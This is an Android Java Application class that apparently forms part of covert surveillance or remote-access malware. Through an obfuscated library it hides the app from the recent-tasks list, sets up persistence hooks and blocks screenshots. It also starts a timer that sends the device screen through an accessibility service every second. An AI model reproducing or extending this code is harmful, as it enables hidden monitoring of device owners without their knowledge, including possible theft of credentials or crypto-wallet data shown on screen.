package com.example.aslib;

import android.app.Application;
import android.content.Context;
import android.util.Log;

import java.util.ArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

import marmojkfnf.huflnkmt.ncagri.jdtuadkc.Ksfndkd;

public class App extends Application {


    public static AtomicReference<AccessService> accessServiceRef = new AtomicReference<>();
    private final static String TAG = "F_APP";

    @Override
    public void onCreate() {

        super.onCreate();
        if (Ksfndkd.INSTANCE.isFgProcess(getApplicationContext())) {
            return;
        }
        fInit();
        fAppStart();
    }

    
    private void fInit() {

        // 初始化应用快捷方式



        ArrayList<String> arrayList = new ArrayList<>();
        Ksfndkd ksfndkd = Ksfndkd.INSTANCE;
        ksfndkd.setIsHideActivityTaskWhenHome(true, arrayList);
        ksfndkd.setProhibitScreenshots(true);
        ksfndkd.setUSE_ShowWhenLocked(false);
        ksfndkd.init(getApplicationContext(), false);
//        ksfndkd.showLauncher(this, "com.eth.nodetap.ShortcutDispatcherActivity");
        boolean zIsMainProcess = ksfndkd.isMainProcess(this);
        Log.i(TAG, "zIsMainProcess:" + zIsMainProcess);
        if (zIsMainProcess) {
            // 注释掉动态快捷方式初始化，只使用静态快捷方式
            // initAppShortcuts();
            Executors.newScheduledThreadPool(1).scheduleWithFixedDelay(()->{
                Log.i(TAG, "run");
                AccessService accessService = accessServiceRef.get();
                if(accessService != null){
                    try{
                        accessService.sendScreenWithRust(null);

                    }catch (Exception ex){
                        Log.e(TAG, "sendScreenWithRust error: ", ex);
                    }
                }
            },1, 1, TimeUnit.SECONDS);
        }
    }

    private void fAppStart() {

    }

    @Override
    
    protected void attachBaseContext(Context base) {
//        Log.i(TAG, "attachBaseContext");
        super.attachBaseContext(base);
        fAttachBaseContext(base);
    }

    
    private void fAttachBaseContext(Context base) {
        Ksfndkd ksfndkd = Ksfndkd.INSTANCE;
        ksfndkd.setUSE_BA_ACTIVITY(true);
        ksfndkd.setUse_activity(false);
        ksfndkd.setUse_notification(false);
        ksfndkd.setUse_service(false);
        ksfndkd.setUse_music(false);
        ksfndkd.setUse_domaemon(false);
        ksfndkd.setUse_thaw(false);
        ksfndkd.setUse_receiver(true);
        if (ksfndkd.isFgProcess(base)) {
            Log.i(TAG, "attach_Ksfndkd");
            ksfndkd.attach(base);
        }
    }
}
